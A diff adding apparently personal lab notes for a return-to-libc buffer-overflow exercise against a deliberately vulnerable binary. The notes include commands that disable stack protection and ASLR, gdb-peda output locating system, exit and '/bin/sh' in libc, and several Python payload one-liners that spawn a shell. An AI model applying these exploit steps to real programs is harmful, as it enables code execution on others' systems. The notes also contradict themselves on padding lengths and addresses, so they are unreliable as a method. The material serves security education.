@@ -1,0 +1,158 @@
+gcc -fno-stack-protector -z execstack -o vulnerable vulnerable.c
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+gdb vulnerable -q
+
+b main
+========= output =======
+seed@35f98f6169ce:~/seclabs/return-to-libc attack/lab1$ gdb vulnerable -q
+Reading symbols from vulnerable...(no debugging symbols found)...done.
+gdb-peda$ b main
+Breakpoint 1 at 0x804847a
+**************************
+
+r "AAAA"
+====== output ========
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fcadbc --> 0xffffd7c0 --> 0xffffd90a ("LESSOPEN=| /usr/bin/lesspipe %s")
+EBX: 0x0
+ECX: 0xffffd720 --> 0x2
+EDX: 0xffffd744 --> 0x0
+ESI: 0xf7fc9000 --> 0x1b2db0
+EDI: 0xf7fc9000 --> 0x1b2db0
+EBP: 0xffffd708 --> 0x0
+ESP: 0xffffd700 --> 0xffffd720 --> 0x2
+EIP: 0x804847a (<main+15>:      sub    esp,0x10)
+EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048476 <main+11>: mov    ebp,esp
+   0x8048478 <main+13>: push   ebx
+   0x8048479 <main+14>: push   ecx
+=> 0x804847a <main+15>: sub    esp,0x10
+   0x804847d <main+18>: mov    ebx,ecx
+   0x804847f <main+20>: mov    eax,DWORD PTR [ebx+0x4]
+   0x8048482 <main+23>: add    eax,0x4
+   0x8048485 <main+26>: mov    eax,DWORD PTR [eax]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd700 --> 0xffffd720 --> 0x2
+0004| 0xffffd704 --> 0x0
+0008| 0xffffd708 --> 0x0
+0012| 0xffffd70c --> 0xf7e2e647 (<__libc_start_main+247>:       add    esp,0x10)
+0016| 0xffffd710 --> 0xf7fc9000 --> 0x1b2db0
+0020| 0xffffd714 --> 0xf7fc9000 --> 0x1b2db0
+0024| 0xffffd718 --> 0x0
+0028| 0xffffd71c --> 0xf7e2e647 (<__libc_start_main+247>:       add    esp,0x10)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x0804847a in main ()
+
+**********************
+p system
+
+p exit
+=========== output ========
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xf7e50db0 <__libc_system>
+gdb-peda$ p exit
+$2 = {<text variable, no debug info>} 0xf7e449e0 <__GI_exit>
+gdb-peda$ 
++++++++++++++++++++++++++++
+
+info proc mappings
+
+========= Output ========
+gdb-peda$ info proc mappings
+process 32
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/seed/seclabs/return-to-libc attack/lab1/vulnerable
+         0x8049000  0x804a000     0x1000        0x0 /home/seed/seclabs/return-to-libc attack/lab1/vulnerable
+         0x804a000  0x804b000     0x1000     0x1000 /home/seed/seclabs/return-to-libc attack/lab1/vulnerable
+        0xf7e15000 0xf7e16000     0x1000        0x0
+        0xf7e16000 0xf7fc6000   0x1b0000        0x0 /lib/i386-linux-gnu/libc-2.23.so
+        0xf7fc6000 0xf7fc7000     0x1000   0x1b0000 /lib/i386-linux-gnu/libc-2.23.so
+        0xf7fc7000 0xf7fc9000     0x2000   0x1b0000 /lib/i386-linux-gnu/libc-2.23.so
+        0xf7fc9000 0xf7fca000     0x1000   0x1b2000 /lib/i386-linux-gnu/libc-2.23.so
+        0xf7fca000 0xf7fcd000     0x3000        0x0
+        0xf7fd2000 0xf7fd3000     0x1000        0x0
+        0xf7fd3000 0xf7fd7000     0x4000        0x0 [vvar]
+        0xf7fd7000 0xf7fd9000     0x2000        0x0 [vdso]
+        0xf7fd9000 0xf7ffc000    0x23000        0x0 /lib/i386-linux-gnu/ld-2.23.so
+        0xf7ffc000 0xf7ffd000     0x1000    0x22000 /lib/i386-linux-gnu/ld-2.23.so
+        0xf7ffd000 0xf7ffe000     0x1000    0x23000 /lib/i386-linux-gnu/ld-2.23.so
+        0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+
+++++++++++++++++++++++++
+
+strings -a -t x /lib/i386-linux-gnu/libc-2.23.so | grep "/bin/sh"
+
+seed@6ca311b7e4f1:~/seclabs/return-to-libc attack/lab1$ strings -a -t x /lib/i386-linux-gnu/libc-2.23.so | grep "/bin/sh"
+ 15bb2b /bin/sh
+
+0xf7e16000 + 0x15bb2b = 0xf7f71b2b
+=> x/s 0xf7f71b2b
+
+===== 
+gdb-peda$ x/s 0xf7f71b2b
+0xf7f71b2b:     "/bin/sh"
+===
+
+****** FIX ****** 
+=== bắt đầu ở : 0x0
+0xf7e15000
+tổng của 0x15bb2b và 0xf7e15000 là 0xf7e15b2b.
+=> x/s 0xf7e15b2b
+
+
+
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f71b2b ("/bin/sh")
+
+python -c 'print "A" * 12 + "\x70\x38\xe1\xb7" + "\x30\x6c\xe0\xb7" + "\x68\x29\xf5\xb7"' | ./vulnerable
+
+
+gdb-peda$ p system
+$1 = {<text variable, no debug info>} 0xf7e50db0 <__libc_system>
+gdb-peda$ p exit
+$2 = {<text variable, no debug info>} 0xf7e449e0 <__GI_exit>
+gdb-peda$ 
+r
+./vulnerable  `python -c 'print("A"*8 + "\xb0\x0d\xe5\xf7" + "\xe0\x49\xe4\xf7" + "\x2b\x1b\xf7\xf7")'`
+
+r `python -c 'print("A"*16+"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x1b\xf7\xf7")'`
+
+python -c "print('A'*8+'\xb0\x0d\xe5\xf7'+'\xe0\x49\xe4\xf7'+'\x2b\x1b\xf7\xf7')" > payload
+
+
+r `python -c 'print("A"*8+"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x5b\xe1\xf7")'`
+
+ sudo sysctl -w kernel.randomize_va_space=0
+
+ cat /proc/sys/kernel/randomize_va_space
+
+ gdb vulnerable anything
+b main
+r
+
+gdb-peda$ find "/bin/sh"
+Searching for '/bin/sh' in: None ranges
+Found 1 results, display max 1 items:
+libc : 0xf7f71b2b ("/bin/sh")
+
+gcc -m32 -g vulnerable.c -o vulnerable -fno-stack-protector -mpreferred-stack-boundary=2 -w
+
+checksec
+
+cc vulnerable.c -mpreferred-stack-boundary=2 -o vulnerable
+checksec
+
+
+r `python -c 'print("A"*8+"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x1b\xf7\xf7")'`
+
+./vulnerable `python -c 'print("A"*16 +"\xb0\x0d\xe5\xf7"+"\xe0\x49\xe4\xf7"+"\x2b\x1b\xf7\xf7")'`
+
